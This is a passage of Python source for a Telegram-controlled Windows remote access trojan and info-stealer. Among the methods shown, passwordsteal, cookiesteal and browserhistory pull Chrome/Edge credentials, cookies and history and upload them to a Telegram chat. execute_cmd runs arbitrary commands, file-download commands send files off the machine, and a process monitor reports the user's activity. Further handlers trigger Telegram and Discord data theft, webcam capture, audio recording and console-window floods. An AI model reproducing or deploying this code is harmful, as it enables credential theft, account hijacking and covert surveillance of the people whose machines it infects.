            return f"<b>System shutdown initiated on</b> <u><i>{self.device_id}</i></u>."
        except Exception as e:
            logging.error(f"Error shutting down system: {str(e)}")
            return f"Error shutting down system on <u><i>{self.device_id}</i></u>: {str(e)}"

    def lock_screen(self):
        """Lock the screen (Windows+L)."""
        try:
            ctypes.windll.user32.LockWorkStation()
            logging.info("Screen locked")
            return f"<b>Screen locked on</b> <u><i>{self.device_id}</i></u>."
        except Exception as e:
            logging.error(f"Error locking screen: {str(e)}")
            return f"Error locking screen on <u><i>{self.device_id}</i></u>: {str(e)}"

    def open_url(self, url):
        """Open a URL in the default browser."""
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            subprocess.run(['start', url], shell=True, check=True)
            logging.info(f"Opened URL: {url}")
            return f"<b>Opened URL {url} on</b> <u><i>{self.device_id}</i></u>."
        except Exception as e:
            logging.error(f"Error opening URL: {str(e)}")
            return f"Error opening URL on <u><i>{self.device_id}</i></u>: {str(e)}"

    def send_msg(self, text):
        """Type text into the active window."""
        try:
            keyboard.write(text)
            keyboard.press_and_release('enter')
            logging.info(f"Sent keys: {text}")
            return f"<b>Sent text '{text}' on</b> <u><i>{self.device_id}</i></u>."
        except Exception as e:
            logging.error(f"Error sending keys: {str(e)}")
            return f"Error sending keys on <u><i>{self.device_id}</i></u>: {str(e)}"

    def get_clipboard(self):
        """Get the clipboard content."""
        try:
            win32clipboard.OpenClipboard()
            try:
                data = win32clipboard.GetClipboardData()
                logging.info("Retrieved clipboard data")
                return f"<b>Clipboard content on</b> <u><i>{self.device_id}</i></u>: {data}"
            finally:
                win32clipboard.CloseClipboard()
        except Exception as e:
            logging.error(f"Error getting clipboard: {str(e)}")
            return f"Error getting clipboard on <u><i>{self.device_id}</i></u>: {str(e)}"
            
    def rickroll(self):
        """🎵 Opens MARWAN PABLO on YouTube"""
        try:
            import webbrowser
            webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
            return f"🎵 <b>RICKROLL ACTIVATED</b> - Never gonna give you up! 😎 on <u><i>{self.device_id}</i></u>."
        except:
            return "❌ Rickroll failed"

    def cmdflood(self, count=20, message='Hello friend "you are hacked"', timeout=7):
        """💥 Opens X CMD windows"""
        try:
            count = min(int(count), 50)  # Max 50
            timeout = int(timeout)
            # Escape quotes in message for CMD
            escaped_message = message.replace('"', '""')
            for _ in range(count):
                subprocess.Popen(f'start cmd /c "color a & echo {escaped_message} & timeout {timeout} >nul"', shell=True)
            return f"💥 <b>CMD FLOOD - <u>{count}</u> CMD windows opened! on</b> <u><i>{self.device_id}</i></u>."
        except:
            return "❌ CMD flood failed."

    def upload_file(self, file_id):
        """📤 Downloads a file from Telegram and saves it"""
        try:
            file_info = requests.get(
                f'https://api.telegram.org/bot{self.bot_token}/getFile',
                params={'file_id': file_id}
            ).json()
            if not file_info.get('ok'):
                return "❌ Failed to get file info."
            
            file_path = file_info['result']['file_path']
            file_url = f'https://api.telegram.org/file/bot{self.bot_token}/{file_path}'
            
            local_path = os.path.join(self.temp_dir, f"uploaded_{int(time.time())}.jpg")
            response = requests.get(file_url)
            with open(local_path, 'wb') as f:
                f.write(response.content)
            
            return f"📤 <b>FILE UPLOADED - Saved to: <code lang='path'>{local_path}</code></b> on <u><i>{self.device_id}</i></u>."
        except Exception as e:
            return f"❌ Upload failed: {str(e)} on <u><i>{self.device_id}</i></u>."

    def passwordsteal(self):
        """🔑 Steals passwords from Chrome/Edge and creates Markdown file"""
        try:
            passwords = self.get_browser_passwords()
            if not passwords:
                return "🔑 <b>No passwords found</b>."
            
            # Create Markdown file
            file_path = self.create_md('passwords', passwords, '🔑 Passwords Stolen')
            if not file_path:
                return "❌ Failed to create passwords file."
            
            # Send the file via Telegram
            with open(file_path, 'rb') as f:
                files = {'document': (os.path.basename(file_path), f)}
                file_payload = {'chat_id': self.chat_id}
                response = requests.post(self.telegram_file_api, data=file_payload, files=files, timeout=30)
                response.raise_for_status()
                logging.info(f"Sent passwords file to Telegram: {file_path}")
            # Delete passwords file
            os.remove(file_path)
            return f"🔑 <b>{len(passwords)} PASSWORDS STOLEN</b> and sent as file!"
        except Exception as e:
            logging.error(f"Error in passwordsteal: {str(e)}")
            return f"❌ Password steal failed: {str(e)}"

    def cookiesteal(self):
        """🍪 Steals cookies from Chrome/Edge and creates Markdown file"""
        try:
            cookies = self.get_browser_cookies()
            if not cookies:
                return "🍪 <b>No cookies found</b>."
            
            # Create Markdown file
            file_path = self.create_md('cookies', cookies, '🍪 Cookies Stolen')
            if not file_path:
                return "❌ Failed to create cookies file."
            
            # Send the file via Telegram
            with open(file_path, 'rb') as f:
                files = {'document': (os.path.basename(file_path), f)}
                file_payload = {'chat_id': self.chat_id}
                response = requests.post(self.telegram_file_api, data=file_payload, files=files, timeout=30)
                response.raise_for_status()
                logging.info(f"Sent cookies file to Telegram: {file_path}")
            # Delete cookies file
            os.remove(file_path)
            return f"🍪 <b>{len(cookies)} COOKIES STOLEN</b> and sent as file!"
        except Exception as e:
            logging.error(f"Error in cookiesteal: {str(e)}")
            return f"❌ Cookie steal failed on <u><i>{self.device_id}</i></u>: {str(e)}"

    def browserhistory(self):
        """🌐 Steals browser history"""
        try:
            history = []
            browsers = self.get_browser_paths()
            
            for browser, path in browsers.items():
                if os.path.exists(path):
                    profiles = ['Default']
                    for profile in profiles:
                        history_db = os.path.join(path, profile, 'History')
                        if os.path.exists(history_db):
                            temp_db = os.path.join(self.temp_dir, f'{browser}_history')
                            shutil.copy2(history_db, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute('SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 20')
                            for row in cursor.fetchall():
                                url, title, count = row
                                if url and title:
                                    history.append(f'{browser} | {title[:50]}... | {url} | Visits: {count}')
                            conn.close()
                            os.remove(temp_db)
            
            if not history:
                return "🌐 <b>No browser history found</b>."
            
            # Create Markdown file
            file_path = self.create_md('history', history, '🌐 Browser History Stolen')
            if not file_path:
                return "❌ Failed to create history file on <u><i>{self.device_id}</i></u>."
            
            # Send the file via Telegram
            with open(file_path, 'rb') as f:
                files = {'document': (os.path.basename(file_path), f)}
                file_payload = {'chat_id': self.chat_id}
                response = requests.post(self.telegram_file_api, data=file_payload, files=files, timeout=30)
                response.raise_for_status()
                logging.info(f"Sent history file to Telegram: {file_path}")
            # Delete history file
            os.remove(file_path)
            return f"🌐 <b>{len(history)} HISTORY ENTRIES</b> sent as file!"
        except Exception as e:
            logging.error(f"Error in browserhistory: {str(e)}")
            return f"❌ Browser history steal failed on <u><i>{self.device_id}</i></u>: {str(e)}"            
            
    def set_clipboard(self, text):
        """Set the clipboard content."""
        try:
            win32clipboard.OpenClipboard()
            try:
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardText(text)
                logging.info(f"Set clipboard to: {text}")
                return f"<b>Clipboard set to '{text}' on</b> <u><i>{self.device_id}</i></u>."
            finally:
                win32clipboard.CloseClipboard()
        except Exception as e:
            logging.error(f"Error setting clipboard: {str(e)}")
            return f"Error setting clipboard on <u><i>{self.device_id}</i></u>: {str(e)}"

    def download_file(self, file_path):
        """Download a file from the device via Telegram."""
        try:
            if not os.path.exists(file_path):
                logging.warning(f"File does not exist: {file_path}")
                return f"File <pre><code language='path'>{file_path}</code></pre> does not exist on <u><i>{self.device_id}</i></u>."
            if os.path.getsize(file_path) > 50 * 1024 * 1024:
                logging.warning(f"File too large: {file_path}")
                return f"File <pre><code language='path'>{file_path}</code></pre> is too large (max 50MB) on <u><i>{self.device_id}</i></u>."
            max_attempts = 5
            for attempt in range(max_attempts):
                try:
                    with open(file_path, 'rb') as f:
                        files = {'document': (os.path.basename(file_path), f)}
                        payload = {'chat_id': self.chat_id}
                        response = requests.post(self.telegram_file_api, data=payload, files=files, timeout=30)
                        response.raise_for_status()
                    logging.info(f"Sent file: {file_path}")
                    return f"File <pre><code language='path'>{file_path}</code></pre> sent from <u><i>{self.device_id}</i></u>."
                except WindowsError as e:
                    if e.winerror == 32:
                        logging.warning(f"Attempt {attempt + 1}: File in use, retrying...")
                        time.sleep(1)
                    else:
                        raise e
            raise WindowsError("Failed to send file after multiple attempts: file still in use")
        except Exception as e:
            logging.error(f"Error downloading file: {str(e)}")
            return f"Error downloading file on <u><i>{self.device_id}</i></u>: {str(e)}"

    def execute_cmd(self, command):
        """Execute a command in cmd."""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            output = result.stdout or result.stderr or "No output."
            if len(output) > 4000:
                temp_file = os.path.join(self.temp_dir, f'cmd_output_{int(time.time())}.txt')
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(output)
                self.download_file(temp_file)
                os.remove(temp_file)
                logging.info(f"Command output too large, sent as file: {temp_file}")
                return f"<b>Command executed on</b> <u><i>{self.device_id}</i></u>, output sent as file."
            logging.info(f"Executed command: {command}")
            return f"<b>Command executed on</b> <u><i>{self.device_id}</i></u>:\n{output}"
        except Exception as e:
            logging.error(f"Error executing command: {str(e)}")
            return f"Error executing command on <u><i>{self.device_id}</i></u>: {str(e)}"

    def enable_sound(self):
        """Enable system sound."""
        try:
            pythoncom.CoInitialize()
            sessions = AudioUtilities.GetAllSessions()
            for session in sessions:
                volume = session._ctl.QueryInterface(ISimpleAudioVolume)
                volume.SetMute(0, None)
            pythoncom.CoUninitialize()
            logging.info("Sound enabled")
            return f"<b>Sound enabled on</b> <u><i>{self.device_id}</i></u>."
        except Exception as e:
            logging.error(f"Error enabling sound: {str(e)}")
            return f"Error enabling sound on <u><i>{self.device_id}</i></u>: {str(e)}"

    def play_loud_sound(self):
        """Play a loud sound."""
        try:
            self.enable_sound()
            pythoncom.CoInitialize()
            sessions = AudioUtilities.GetAllSessions()
            for session in sessions:
                volume = session._ctl.QueryInterface(ISimpleAudioVolume)
                volume.SetMasterVolume(1.0, None)
            winsound.Beep(1000, 1000)
            pythoncom.CoUninitialize()
            logging.info("Played loud sound")
            return f"<b>Played loud sound on</b> <u><i>{self.device_id}</i></u>."
        except Exception as e:
            logging.error(f"Error playing loud sound: {str(e)}")
            return f"Error playing loud sound on <u><i>{self.device_id}</i></u>:\n<pre><code class='language-error'>{str(e)}</code></pre>"

    def enable_wifi(self):
        """Enable WiFi."""
        try:
            subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'enabled'], check=True)
            logging.info("WiFi enabled")
            return f"<b>WiFi enabled on</b> <u><i>{self.device_id}</i></u>."
        except Exception as e:
            logging.error(f"Error enabling WiFi: {str(e)}")
            return f"Error enabling WiFi on <u><i>{self.device_id}</i></u>:\n<pre><code class='language-error'>{str(e)}</code></pre>"

    def disable_wifi(self):
        """Disable WiFi."""
        try:
            subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'disabled'], check=True)
            logging.info("WiFi disabled")
            return f"<b>WiFi disabled on</b> <u><i>{self.device_id}</i></u>."
        except Exception as e:
            logging.error(f"Error disabling WiFi: {str(e)}")
            return f"Error disabling WiFi on <u><i>{self.device_id}</i></u>:\n<pre><code class='language-error'>{str(e)}</code></pre>"

    def trigger_hotkey(self, hotkey):
        """Trigger a hotkey combination."""
        try:
            keyboard.press_and_release(hotkey)
            logging.info(f"Triggered hotkey: {hotkey}")
            return f"<b>Triggered hotkey on</b> <u><i>{self.device_id}</i></u>: {hotkey}"
        except Exception as e:
            logging.error(f"Error triggering hotkey: {str(e)}")
            return f"Error triggering hotkey on <u><i>{self.device_id}</i></u>:\n<pre><code class='language-error'>{str(e)}</code></pre>"

    def monitor_processes(self):
        """Monitor running processes and detect specific activities."""
        while self.running:
            try:
                current_process = None
                foreground_window = ctypes.windll.user32.GetForegroundWindow()
                pid = ctypes.c_ulong()
                ctypes.windll.user32.GetWindowThreadProcessId(foreground_window, ctypes.byref(pid))
                for proc in psutil.process_iter(['name', 'pid']):
                    if proc.info['pid'] == pid.value:
                        current_process = proc.info['name'].lower()
                        break
                if current_process and current_process != self.last_process:
                    self.last_process = current_process
                    if current_process in ['chrome.exe', 'msedge.exe']:
                        activity = "Browsing"
                    elif current_process == 'cs2.exe':
                        activity = "Playing CS2"
                    else:
                        activity = f"Running {current_process}"
                    self.send_telegram_message(f"<b>User is {activity} on</b> <i><u>{self.device_id}</u></i>\n<b>Process: {current_process}</b>")
                    logging.info(f"Detected activity: {activity}")
                time.sleep(2)
            except Exception as e:
                logging.error(f"Error monitoring processes: {str(e)}")
                time.sleep(2)
        
    def sanitize_filename(self, name, for_markdown=True):
        """Cleans the file name by escaping special characters for MarkdownV2 or keeps the original for files."""
        try:
            import re
            sanitized = name
            # First, remove invalid characters, keeping letters, numbers, spaces, dots, dashes, and underscores.
            sanitized = re.sub(r'[^\w\s.-]', '_', sanitized)
            # Remove extra spaces (replace with single spaces, not underscores).
            sanitized = re.sub(r'\s+', ' ', sanitized).strip()
            # Remove emojis (Unicode U+1F000 and above).
            sanitized = re.sub(r'[\U0001F000-\U0010FFFF]', '_', sanitized)
            if for_markdown:
                # Escape MarkdownV2 special characters after cleaning.
                markdown_special_chars = r'([_*\[\]()~`>#+\-=|{}.!])'
                sanitized = re.sub(markdown_special_chars, r'\\\1', sanitized)
            # Limit the file name length for Markdown.
            if for_markdown and len(sanitized) > 100:
                sanitized = sanitized[:97] + '...'
            return sanitized
        except Exception as e:
            logging.error(f"Error while cleaning the file name {name}: {str(e)}")
            return "invalid_filename"

    def list_files(self, path=None, page=0):
        """Returns the list of files as a table with buttons and pagination."""
        try:
            if path is None:
                path = self.data_dir
            if not os.path.exists(path):
                return f"❌ Path *{self.sanitize_filename(path, for_markdown=True)}* does not exist on {self.device_id}."

            files = []
            try:
                for item in os.listdir(path):
                    try:
                        full_path = os.path.join(path, item)
                        if os.path.isfile(full_path):
                            size = os.path.getsize(full_path)
                            files.append({"name": item, "size": f"{size} byte", "path": full_path})
                        else:
                            files.append({"name": f"{item}/", "size": "📁 Folder", "path": full_path})
                    except (OSError, PermissionError) as e:
                        logging.warning(f"Failed to get information about {item}: {str(e)}")
                        files.append({"name": item, "size": "⚠️ Unavailable", "path": full_path})
            except (OSError, PermissionError) as e:
                logging.error(f"Error accessing the directory {path}: {str(e)}")
                return f"Error accessing the directory *{self.sanitize_filename(path, for_markdown=True)}*: {str(e)}"

            if not files:
                return f"📂 In the directory `{self.sanitize_filename(path, for_markdown=True)}` No files."

            # Sorting: photos and videos on top
            PHOTO_EXT = [".jpg", ".jpeg", ".png", ".gif"]
            VIDEO_EXT = [".mp4", ".avi", ".mov", ".mkv"]
            photos = [f for f in files if os.path.splitext(f["name"])[1].lower() in PHOTO_EXT]
            videos = [f for f in files if os.path.splitext(f["name"])[1].lower() in VIDEO_EXT]
            others = [f for f in files if f not in photos + videos]
            files = photos + videos + others

            # Pagination
            files_per_page = 20
            start_idx = page * files_per_page
            end_idx = start_idx + files_per_page
            page_files = files[start_idx:end_idx]

            # Formatting a Markdown table
            table = "```\n{:<45} {:<15}\n{}\n".format("File name", "Size", "-" * 60)
            for item in page_files[:40]:
                name = (item["name"][:42] + "...") if len(item["name"]) > 45 else item["name"]
                sanitized_name = self.sanitize_filename(name, for_markdown=True)
                table += f"{sanitized_name:<45} {item['size']:<15}\n"
            table += "```"

            # Display path in backticks (backticks protect content from Markdown parsing)
            # Replace any backticks in path to avoid breaking the code block
            display_path = path.replace('`', "'")
            message = f"📂 *Files in the directory:* ```{display_path}``` *(Page {page + 1})*\n{table}"
            logging.debug(f"Formatting a message for {path}, Length: {len(message)} characters, files: {len(page_files)}")

            # Checking the message length
            if len(message) > 4000:
                temp_file = os.path.join(self.temp_dir, f'file_list_{int(time.time())}.txt')
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(f"Files in {path} on {self.device_id} (Page {page + 1}):\n\n")
                    f.write(f"{'Name':<50} {'Size':<15}\n")
                    f.write("-" * 65 + "\n")
                    for item in files:
                        name = self.sanitize_filename(item['name'], for_markdown=False)
                        f.write(f"{name:<50} {item['size']:<15}\n")
                result = self.download_file(temp_file)
                os.remove(temp_file)
                logging.info(f"The file list is too long, sent as a file: {temp_file}")
                return f"File list for ```{path}``` too long, sent as a file: {result}"

            # Creating buttons with indexes
            buttons = []
            for i, f in enumerate(page_files):
                if not f["name"].endswith("/"):
                    sanitized_button_text = self.sanitize_filename(f["name"][:30], for_markdown=True)
                    buttons.append([{"text": f"⬇️ {sanitized_button_text}", "callback_data": f"download_{page}_{i}"}])

            # Pagination buttons and download all
            nav_buttons = []
            encoded_path = base64.urlsafe_b64encode(path.encode('utf-8')).decode('utf-8')[:50]
            if page > 0:
                nav_buttons.append({"text": "⬅️ Previous", "callback_data": f"filepage_{page-1}_{encoded_path}"})
            if end_idx < len(files):
                nav_buttons.append({"text": "➡️ Next", "callback_data": f"filepage_{page+1}_{encoded_path}"})
            nav_buttons.append({"text": "🔄 Refresh", "callback_data": f"refresh_{encoded_path}"})
            nav_buttons.append({"text": "📥 Download all", "callback_data": f"download_all_{encoded_path}"})
            if nav_buttons:
                buttons.append(nav_buttons)

            keyboard = {"inline_keyboard": buttons}
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'Markdown',
                'reply_markup': json.dumps(keyboard)
            }

            try:
                response = requests.post(self.telegram_text_api, json=payload, timeout=30)
                response.raise_for_status()
                logging.info(f"File list sent for {path}, Page {page + 1}")
                self.current_files[page] = page_files
                self.current_path = path
                self.all_files = files  # Saving all files for the "Download all" button"
                return f"File list for {path} sent (page {page + 1})."
            except requests.exceptions.HTTPError as e:
                logging.error(f"HTTP error while sending the file list: {str(e)}")
                # Trying without Markdown
                message = f"Files in {path} on {self.device_id} (Page {page + 1}):\n\n"
                for item in page_files[:40]:
                    name = self.sanitize_filename(item['name'], for_markdown=False)
                    message += f"{name:<50} {item['size']:<15}\n"
                payload = {
                    'chat_id': self.chat_id,
                    'text': message,
                    'parse_mode': None,
                    'reply_markup': json.dumps({"inline_keyboard": buttons})
                }
                try:
                    response = requests.post(self.telegram_text_api, json=payload, timeout=30)
                    response.raise_for_status()
                    logging.info(f"File list sent without Markdown for {path}")
                    self.current_files[page] = page_files
                    self.current_path = path
                    self.all_files = files
                    return f"File list for {path} sent without Markdown."
                except requests.exceptions.HTTPError as e2:
                    logging.error(f"Failed to send the file list without Markdown: {str(e2)}")
                    temp_file = os.path.join(self.temp_dir, f'file_list_{int(time.time())}.txt')
                    with open(temp_file, 'w', encoding='utf-8') as f:
                        f.write(message)
                    result = self.download_file(temp_file)
                    os.remove(temp_file)
                    logging.info(f"The list of files has been sent as a file: {temp_file}")
                    return f"The list of files for ```{path}``` sent as a file: {result}"

        except Exception as e:
            logging.error(f"Error while listing files for {path}: {str(e)}")
            return f"Error while listing files: {str(e)}"

    def send_telegram_message(self, message):
        """Send a message to Telegram."""
        try:
            if len(message) > 4000:
                temp_file = os.path.join(self.temp_dir, f'message_{int(time.time())}.txt')
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(message)
                result = self.download_file(temp_file)
                os.remove(temp_file)
                logging.info(f"Message too large, sent as file: {temp_file}")
                return f"Message sent as file from {self.device_id}: {result}"
            payload = {'chat_id': self.chat_id, 'text': message, 'parse_mode': 'HTML'}
            response = requests.post(self.telegram_text_api, data=payload, timeout=30)
            response.raise_for_status()
            logging.info(f"Sent Telegram message from {self.device_id}: {message[:100]}...")
            return f"Message sent from {self.device_id}."
        except requests.exceptions.HTTPError as e:
            logging.error(f"HTTP error sending Telegram message: {str(e)}")
            # Let's try without Markdown
            payload = {'chat_id': self.chat_id, 'text': message.replace('```', '')}
            try:
                response = requests.post(self.telegram_text_api, data=payload, timeout=30)
                response.raise_for_status()
                logging.info(f"Sent Telegram message without Markdown: {message[:100]}...")
                return f"Message sent from {self.device_id}."
            except requests.exceptions.HTTPError as e2:
                logging.error(f"Failed to send Telegram message without Markdown: {str(e2)}")
                # Send as a file
                temp_file = os.path.join(self.temp_dir, f'message_{int(time.time())}.txt')
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(message)
                result = self.download_file(temp_file)
                os.remove(temp_file)
                logging.info(f"Message sent as file due to HTTP error: {temp_file}")
                return f"Message sent as file from {self.device_id}: {result}"
        except Exception as e:
            logging.error(f"Error sending Telegram message from {self.device_id}: {str(e)}")
            return f"Error sending Telegram message from {self.device_id}: {str(e)}"

    def handle_telegram_commands(self):
        """Processes all incoming Telegram commands."""
        offset = 0
        while self.running:
            try:
                with update_lock:
                    updates = requests.get(
                        f'https://api.telegram.org/bot{self.bot_token}/getUpdates',
                        params={'offset': offset, 'timeout': 30},
                        timeout=30
                    ).json()

                if not updates.get('ok'):
                    time.sleep(5)
                    continue

                for update in updates.get('result', []):
                    offset = update['update_id'] + 1

                    # === TEXT COMMANDS ===
                    if 'message' in update and 'text' in update['message']:
                        chat_id = update['message']['chat']['id']
                        if str(chat_id) != self.chat_id:
                            continue

                        command = update['message']['text'].strip()
                        
                        # Essential device management commands that must always execute
                        device_management_commands = ['/listdevices', '/debugdevices']
                        is_device_management_command = (
                            command in device_management_commands or 
                            command.startswith('/selectdevice ')
                        )
                        
                        # Execute device management commands without device selection check
                        if is_device_management_command:
                            if command == '/listdevices':
                                self.send_telegram_message(self.list_devices())
                            elif command.startswith('/selectdevice '):
                                device_id = command.split(' ', 1)[1]
                                self.send_telegram_message(self.set_selected_device(chat_id, device_id)),
                                self.send_telegram_message(self.debug_devices())
                            elif command == '/debugdevices':
                                self.send_telegram_message(self.debug_devices())
                            continue

                        selected_device = self.get_selected_device(chat_id)
                        logging.debug(f"Device {self.device_id}: selected_device={selected_device}, self.device_id={self.device_id}")

                        # Validate device state before executing commands
                        # If a device is selected, validate it exists and matches this device
                        if selected_device:
                            # Double-check: ensure selected device still exists (defense in depth)
                            with file_lock:
                                devices = self.load_devices()
                                selected_device_lower = selected_device.lower()
                                device_still_exists = False
                                for existing_id in devices['devices']:
                                    if existing_id.lower() == selected_device_lower:
                                        device_still_exists = True
                                        break
                                
                                # If selected device no longer exists, skip command (get_selected_device should have cleared it, but be safe)
                                if not device_still_exists:
                                    logging.warning(f"Device {self.device_id}: Selected device {selected_device} no longer exists, skipping command")
                                    continue
                            
                            # Execute only if this is the selected device
                            if selected_device.lower() != self.device_id.lower():
                                logging.debug(f"Device {self.device_id}: Skipping command - selected device is {selected_device}")
                                continue
                            
                            # Final validation: ensure selection hasn't changed during command processing
                            with file_lock:
                                devices = self.load_devices()
                                current_selection = devices['selected'].get(str(chat_id))
                                if current_selection is None or current_selection.lower() != selected_device.lower():
                                    logging.warning(f"Device {self.device_id}: Selection changed during command processing, aborting")
                                    continue
                        else:
                            # No device selected - provide helpful message based on device count
                            with file_lock:
                                devices = self.load_devices()
                                device_count = len(devices['devices'])
                            
                            if device_count == 0:
                                self.send_telegram_message("<b>No devices registered. Please wait for a device to register.</b>")
                            elif device_count > 1:
                                self.send_telegram_message(f"<b>Multiple devices available ({device_count}). Please use /selectdevice &lt;device_id&gt; to choose a device.</b>\n\nUse /listdevices to see available devices.")
                            else:
                                # This shouldn't happen if auto-selection works correctly, but handle it anyway
                                self.send_telegram_message("<b>No device selected. Please use /selectdevice &lt;device_id&gt; to choose a device.</b>")
                            
                            logging.debug(f"Device {self.device_id}: Skipping command - no device selected")
                            continue

                        if command == '/enableautostart':
                            self.send_telegram_message(self.enable_autostart())

                        elif command == '/disableautostart':
                            self.send_telegram_message(self.disable_autostart())
                        elif command == '/cmds':
                            self.send_telegram_message(self.send_commands_list())

                        elif command == '/screenshot':
                            self.send_telegram_message(self.take_screenshot())

                        elif command.startswith('/recordaudio'):
                            parts = command.split()
                            duration = float(parts[1]) if len(parts) > 1 else 5  # default 5 seconds
                            self.send_telegram_message(self.record_audio(duration))

                        elif command == '/webcam':
                            self.capture_webcam()

                        elif command == '/listprocesses':
                            self.send_process_buttons(page=0)

                        elif command == '/exitgame':
                            self.send_process_buttons(page=0)

                        elif command == '/sound':
                            self.send_telegram_message(self.play_loud_sound())

                        elif command == '/onwifi':
                            self.send_telegram_message(self.enable_wifi())

                        elif command == '/offwifi':
                            self.send_telegram_message(self.disable_wifi())

                        elif command.startswith('/turnhotkey '):
                            hotkey = command.split(' ', 1)[1]
                            self.send_telegram_message(self.trigger_hotkey(hotkey))

                        elif command == '/imagepc':
                            self.waiting_for_photo = True
                            self.send_telegram_message(f"Send a photo for wallpaper to {self.device_id}.")

                        elif command == '/imagereturn':
                            self.send_telegram_message(self.restore_wallpaper())

                        elif command == '/showimage':
                            self.waiting_for_showimage = True
                            self.send_telegram_message(f"Send a photo for display on {self.device_id}.")

                        elif command == '/restart':
                            self.send_telegram_message(self.restart_system())

                        elif command == '/shutdown':
                            self.send_telegram_message(self.shutdown_system())

                        elif command == '/lockscreen':
                            self.send_telegram_message(self.lock_screen())

                        elif command.startswith('/openurl '):
                            url = command.split(' ', 1)[1]
                            self.send_telegram_message(self.open_url(url))

                        elif command.startswith('/sendmsg '):
                            text = command.split(' ', 1)[1]
                            self.send_telegram_message(self.send_msg(text))

                        elif command == '/getclipboard':
                            self.send_telegram_message(self.get_clipboard())

                        elif command.startswith('/setclipboard '):
                            text = command.split(' ', 1)[1]
                            self.send_telegram_message(self.set_clipboard(text))

                        elif command == '/listfiles':
                            self.send_telegram_message(self.list_files(page=0))

                        elif command.startswith('/listfiles '):
                            path = command.split(' ', 1)[1]
                            self.send_telegram_message(self.list_files(path, page=0))

                        elif command.startswith('/downloadfile '):
                            file_path = command.split(' ', 1)[1]
                            self.send_telegram_message(self.download_file(file_path))

                        elif command.startswith('/executecmd '):
                            cmd = command.split(' ', 1)[1]
                            self.send_telegram_message(self.execute_cmd(cmd))

                        elif command == '/rickroll':
                            self.send_telegram_message(self.rickroll())

                        elif command == '/cmdflood' or command.startswith('/cmdflood '):
                            if command == '/cmdflood':
                                count = 5
                                message = None
                                timeout = None
                            else:
                                rest = command[len('/cmdflood '):].strip()
                                parts = rest.split(' ', 1) if ' ' in rest else [rest]
                                
                                count = int(parts[0]) if parts[0].isdigit() else 20
                                message = None
                                timeout = None
                                
                                if len(parts) > 1:
                                    remaining = parts[1].strip()
                                    
                                    timeout_index = remaining.find(' -t ')
                                    if timeout_index == -1:
                                        timeout_index = remaining.find(' -t')
                                    
                                    if timeout_index != -1:

                                        message_part = remaining[:timeout_index].strip()
                                        if message_part:

                                            if message_part.startswith('"') or message_part.startswith("'"):
                                                quote_char = message_part[0]
                                                end_quote = message_part.find(quote_char, 1)
                                                if end_quote != -1:
                                                    message = message_part[1:end_quote]
                                                else:
                                                    message = message_part[1:]
                                            else:
                                                message = message_part
                                        
                                        timeout_part = remaining[timeout_index + 3:].strip()  
                                        if timeout_part:
                                            timeout_words = timeout_part.split()
                                            if timeout_words and timeout_words[0].isdigit():
                                                timeout = int(timeout_words[0])
                                    else:
                                        if remaining.startswith('"') or remaining.startswith("'"):
                                            quote_char = remaining[0]
                                            end_quote = remaining.find(quote_char, 1)
                                            if end_quote != -1:
                                                message = remaining[1:end_quote]
                                            else:
                                                message = remaining[1:]
                                        else:
                                            message = remaining
                            
                            if message and timeout is not None:
                                self.send_telegram_message(self.cmdflood(count, message, timeout))
                            elif message:
                                self.send_telegram_message(self.cmdflood(count, message))
                            elif timeout is not None:
                                self.send_telegram_message(self.cmdflood(count, timeout=timeout))
                            else:
                                self.send_telegram_message(self.cmdflood(count))

                        elif command == '/upload':
                            self.waiting_for_upload = True
                            self.send_telegram_message(f"Send file for upload to {self.device_id}.")

                        elif command == '/passwordsteal':
                            self.send_telegram_message(self.passwordsteal())

                        elif command == '/cookiesteal':
                            self.send_telegram_message(self.cookiesteal())

                        elif command == '/browserhistory':
                            self.send_telegram_message(self.browserhistory())

                        elif command == '/steal':
                            threading.Thread(target=self.steal_tdata, daemon=True).start()
                            threading.Thread(target=self.steal_disdata, daemon=True).start()
                        elif command == '/steal tdata':
                            threading.Thread(target=self.steal_tdata, daemon=True).start()
                        elif command == '/steal disdata':
                            threading.Thread(target=self.steal_disdata, daemon=True).start()

                        elif command == '/stop':
                            self.running = False
                            self.send_telegram_message(f"The Bot has been Stopped {self.device_id}.")
                            self.release_lock()
                            sys.exit(0)

                    # === CALLBACK BUTTONS ===
                    elif 'callback_query' in update:
                        callback_data = update['callback_query']['data']
                        chat_id = update['callback_query']['message']['chat']['id']
                        if str(chat_id) != self.chat_id:
                            continue

                        if callback_data.startswith('download_all_'):
                            import base64
                            try:
                                encoded_path = callback_data.replace('download_all_', '')
                                path = base64.urlsafe_b64decode(encoded_path).decode('utf-8')
                                self.send_telegram_message(f"Downloading all files from {path}...")
                                for file in self.all_files:
                                    if os.path.isfile(file["path"]) and os.path.getsize(file["path"]) <= 50 * 1024 * 1024:
                                        self.send_telegram_message(self.download_file(file["path"]))
                                self.send_telegram_message("All files have been sent.")
                            except Exception as e:
                                self.send_telegram_message(f"Error: {e}")

                        elif callback_data.startswith('download_'):
                            try:
                                parts = callback_data.replace('download_', '').split('_')
                                page = int(parts[0])
                                index = int(parts[1])
                                if page in self.current_files and index < len(self.current_files[page]):
                                    file_path = self.current_files[page][index]["path"]
                                    self.send_telegram_message(self.download_file(file_path))
                            except Exception as e:
                                self.send_telegram_message(f"Download error: {e}")

                        elif callback_data.startswith('filepage_'):
                            try:
                                import base64
                                parts = callback_data.split('_', 2)
                                page = int(parts[1])
                                encoded_path = parts[2]
                                path = base64.urlsafe_b64decode(encoded_path).decode('utf-8')
                                self.send_telegram_message(self.list_files(path, page=page))
                            except Exception as e:
                                self.send_telegram_message(f"Transition error: {e}")

                        elif callback_data.startswith('refresh_'):
                            try:
                                import base64
                                encoded_path = callback_data.replace('refresh_', '')
                                path = base64.urlsafe_b64decode(encoded_path).decode('utf-8')
